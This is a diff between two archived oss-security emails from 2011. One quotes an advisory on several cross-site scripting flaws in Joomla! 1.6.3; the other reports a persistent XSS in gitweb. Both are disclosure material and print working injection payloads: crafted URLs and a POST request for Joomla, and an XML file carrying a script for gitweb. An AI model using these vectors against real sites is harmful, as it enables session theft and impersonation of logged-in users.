@@ -1,148 +1,56 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/29/12
-Message-ID: <609112549.1024404.1309377240402.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Wed, 29 Jun 2011 15:54:00 -0400 (EDT)
-From: Josh Bressers <bressers@...hat.com>
-To: oss-security@...ts.openwall.com
-Cc: coley <coley@...re.org>
-Subject: Re: CVE Request: Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS) Vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/03/7
+Message-ID: <1307117712.8176.17.camel@localhost>
+Date: Fri, 03 Jun 2011 11:15:12 -0500
+From: Jamie Strandboge <jamie@...onical.com>
+To: akub Narebski <jnareb@...il.com>, Junio C Hamano <gitster@...ox.com>
+Cc: oss-security@...ts.openwall.com, dave b <db.pub.mail@...il.com>
+Subject: Security issue in gitweb
 Content-Type: text/plain; charset=utf-8
 
-Please use CVE-2011-2509.
+A security bug was reported by 'dave b' (in CC) against gitweb in
+Ubuntu. You are being emailed as the upstream contact. Please keep
+oss-security[1] CC'd for any updates on this issue.
 
-Thanks.
+This issue should be considered public, but has not yet been assigned a
+CVE. Once a CVE is assigned, please mention it in any changelogs.
+
+Details from the public bug follow:
+https://launchpad.net/bugs/777804
+
+From the reporter:
+----
+I am reporting a persistent xss vector in gitweb, note this requires a
+user to have commit access to a repository that gitweb is configured
+to display. The vector is the fact that gitweb "serves" up xml files -
+which can (just as gitweb does) embed html that could be used to
+perform a cross-site scripting attack.
+
+e.g. (lol.xml).
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US"
+lang="en-US">
+<head>
+</head>
+<script>alert(1);</script>
+</html>
+
+and viewed at
+http://$HOSTNAME/$PATH_TO_GITWEB/?p=lolok;a=blob_plain;f=lol.xml
+----
+
+Thanks in advance for your cooperation in coordinating a fix for this
+issue,
+
+Jamie Strandboge
+
+[1] oss-security@...ts.openwall.com is a public mailing list for
+    people to collaborate on security vulnerabilities and coordinate
+    security updates.
 
 -- 
-    JB
+Jamie Strandboge             | http://www.canonical.com
 
------ Original Message -----
-> Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS)
-> Vulnerabilities
-> 
-> 
-> 
-> 1. OVERVIEW
-> 
-> Joomla! 1.6.3 and lower are vulnerable to multiple Cross Site
-> Scripting issues.
-> 
-> 
-> 2. BACKGROUND
-> 
-> Joomla is a free and open source content management system (CMS) for
-> publishing content on the World Wide Web and intranets. It comprises a
-> model–view–controller (MVC) Web application framework that can also be
-> used independently.
-> Joomla is written in PHP, uses object-oriented programming (OOP)
-> techniques and software design patterns, stores data in a MySQL
-> database, and includes features such as page caching, RSS feeds,
-> printable versions of pages, news flashes, blogs, polls, search, and
-> support for language internationalization.
-> 
-> 
-> 3. VULNERABILITY DESCRIPTION
-> 
-> Several parameters (QueryString, option, searchword) in Joomla! Core
-> components (com_content, com_contact, com_newsfeeds, com_search) are
-> not properly sanitized upon submission to the /index.php url, which
-> allows attacker to conduct Cross Site Scripting attack. This may allow
-> an attacker to create a specially crafted URL that would execute
-> arbitrary script code in a victim's browser.
-> 
-> 
-> 4. VERSION AFFECTED
-> 
-> 1.6.3 and lower
-> 
-> 
-> 5. PROOF-OF-CONCEPT/EXPLOIT
-> 
-> 
-> component: com_contact , parameter: QueryString (Browser: All)
-> ===============================================================
-> 
-> http://attacker.in/joomla163_noseo/index.php?option=com_contact&view=category&catid=26&id=36&Itemid=-1"><script>alert(/XSS/)</script>
-> 
-> 
-> component:com_content , parameter: QueryString (Browser: All)
-> ===============================================================
-> 
-> http://attacker.in/joomla163_noseo/index.php?option=com_content&view=category&id=19&Itemid=260&limit=10&filter_order_Dir=&limitstart=&filter_order=><script>alert(/XSS/)</script>
-> 
-> 
-> component: com_newsfeeds , parameter: QueryString (Browser: All)
-> =================================================================
-> 
-> http://attacker.in/joomla163_noseo/index.php?option=com_newsfeeds&view=category&id=17&whateverehere="><script>alert(/XSS/)</script>&Itemid=253&limit=10&filter_order_Dir=ASC&filter_order=ordering
-> 
-> 
-> parameter: option (Browser: All)
-> ====================================
-> 
-> http://attacker.in/joomla163_noseo/index.php?option="><script>alert(/XSS/)</script>&task=reset.request
-> 
-> 
-> component: com_search, parameter: searchword (Browser: IE, Konqueror)
-> =====================================================================
-> 
-> [REQUEST]
-> POST /joomla163/index.php HTTP/1.1
-> Referer: http://attacker.in/joomla163/
-> User-Agent: Konqueror/4.5
-> Cache-Control: no-cache
-> Content-Type: application/x-www-form-urlencoded
-> Host: attacker.in
-> Accept-Encoding: gzip, deflate
-> Content-Length: 125
-> 
-> option=com_search&searchword='%2522%253C%252Fscript%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E&task=search
-> [/REQUEST]
-> 
-> This searchword XSS was identified via source code:
-> http://yehg.net/lab/pr0js/advisories/joomla/core/1.6.3/xss/XSS%20%5bMode=SEO,NON-SEO%5d/(searchword)_xss_vuln_code_portion.jpg
-> 
-> 
-> 6. IMPACT
-> 
-> Attackers can compromise currently logged-in user/administrator
-> session and impersonate arbitrary user actions available under
-> /administrator/ functions.
-> 
-> 
-> 7. SOLUTION
-> 
-> Upgrade to Joomla! 1.6.4 or higher
-> 
-> 
-> 8. VENDOR
-> 
-> Joomla! Developer Team
-> http://www.joomla.org
-> 
-> 
-> 9. CREDIT
-> 
-> This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-> Ethical Hacker Group, Myanmar.
-> 
-> 
-> 10. DISCLOSURE TIME-LINE
-> 
-> 2011-05-26: notified vendor
-> 2011-06-28: vendor released fix
-> 2011-06-28: vulnerability disclosed
-> 
-> 
-> 11. REFERENCES
-> 
-> Original Advisory URL:
-> http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.6.3]_cross_site_scripting(XSS)
-> Vendor Advisory URL:
-> http://developer.joomla.org/security/news/352-20110604-xss-vulnerability.html
-> XSS FAQ: http://www.cgisecurity.com/xss-faq.html
-> OWASP Top 10:
-> http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
-> CWE-79: http://cwe.mitre.org/data/definitions/79.html
-> 
-> 
-> #yehg [2011-06-28]
+Download attachment "signature.asc" of type "application/pgp-signature" (837 bytes)
